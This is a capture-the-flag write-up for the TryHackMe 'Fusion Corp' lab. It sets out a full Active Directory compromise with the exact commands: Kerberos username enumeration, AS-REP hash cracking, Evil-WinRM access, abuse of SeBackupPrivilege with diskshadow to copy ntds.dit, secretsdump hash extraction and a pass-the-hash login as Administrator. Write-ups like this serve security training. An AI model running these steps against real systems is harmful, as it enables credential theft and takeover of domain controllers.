---
description: https://tryhackme.com/room/fusioncorp
---

# Fusion Corp

## Nmap

```
sudo nmap 10.10.75.130 -sS -sV -p-

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-20 13:33:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Starting off I attempted basic `SMB` enumeration and was unable to enumerate any meaningful information. From here I moved to `LDAP` and used the `Nmap` script shown below to pull domain information.

```bash
nmap -n -sV --script "ldap* and not brute" <IP>
```

From this we ascertain the domain name is 'Fusion.Corp'. From this we can start enumerating Kerbeos.

**Kerberos**

**Install Kerbrute:** [**https://github.com/ropnop/kerbrute**](https://github.com/ropnop/kerbrute)

```
./kerbrute userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -d fusion.corp --dc 10.10.7.24 -v | grep 'VALID USERNAME:'
```

![](<../../../.gitbook/assets/image (1765) (1).png>)

Storing the discovered users in a file called 'asrep-hashes'. I then run GetNPUsers from Impacket against both the discovered usernames in order to retrieve Kerberos hashes.

```
python2 GetNPUsers.py <Domain>/ -usersfile <File> -format hashcat -outputfile <File>
```

![](<../../../.gitbook/assets/image (1766).png>)

Viewing the contents of asrep-hashes we see we have a hash for the user lparker.

![](<../../../.gitbook/assets/image (1767).png>)

Running this against Hashcat shows we soon crack the password.

```
hashcat -m 18200 -a 0 asrep-hashes /usr/share/wordlists/rockyou.txt 
```

![](<../../../.gitbook/assets/png1 (1).png>)

We are then able to utilize the credentials against port 5985 with Evil-WinRM.

```
evil-winrm -i 10.10.22.38 -u lparker -p '<Password>'
```

![](../../../.gitbook/assets/Capture\_1.png)

After grabbing the user flag on the Desktop I started working through basic enumeration. First checking local user accounts we see some interesting information for the user jmurphy.

```
net user jmurphy
```

![](../../../.gitbook/assets/Capture\_2.png)

We are then able to login with Evil-WinRM using the new credentials.

![](../../../.gitbook/assets/Capture\_3.png)

Again, the user flag can be grabbed from the Desktop. From here and as per the above image we see we have the privilege 'SeBackupPrivilege'.

This privilege grants us the ability to create backups of files on the system. Knowing this a high value file would be the ntds.dit file which is a database of hashes for domain objects / users. As the ntds.dit file is in constant use we will be unable to create a backup using normal methods as the system will lock the file.

What we can do instead is create a Distributed Shell File (DSH). This file will contain the appropriate commands for us to run the diskshadow utility against the C: drive and ultimately the ntds.dit file.

First created a file called `viper.dsh` on the attacking machine. Then insert the following contents:

```
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```

Once completed use the command `unix2dos` to convert the file to DOS format.

```
unix2dos viper.dsh
```

Then on the target system create a directory called 'temp' in `c:\temp.` After this upload the `viper.dsh` file.

![](<../../../.gitbook/assets/image (1772).png>)

From here run the following commands:

```
diskshadow /s viper.dsh
```

![](<../../../.gitbook/assets/image (1773).png>)

```
robocopy /b x:\windows\ntds . ntds.dit
```

![](<../../../.gitbook/assets/image (1774).png>)

From here we need to extract the SYSTEM hive which will be required for extracting the hashes with Impacket later.

```
reg save hklm\system c:\Temp\system
```

![](<../../../.gitbook/assets/image (1775).png>)

From here we can use the download command to download the ntds.dit and system hive file.

```
download ntds.dit
download system
```

![](<../../../.gitbook/assets/image (1776).png>)

Back on the attacking machine use the following command with Impacket to extract the hashes from ntds.dit.

```
python2 secretsdump.py -ntds ntds.dit -system system local
```

![](../../../.gitbook/assets/Capture\_4.png)

From here we have the Administrator hash which can be used to login to the target system with Evil-WinRM.

```
evil-winrm -i <IP> -u administrator -H '<NT-Hash>'
```

![](../../../.gitbook/assets/Capture\_5.png)

We are now Administrator on the Domain Controller and can grab the final flag from the Desktop.
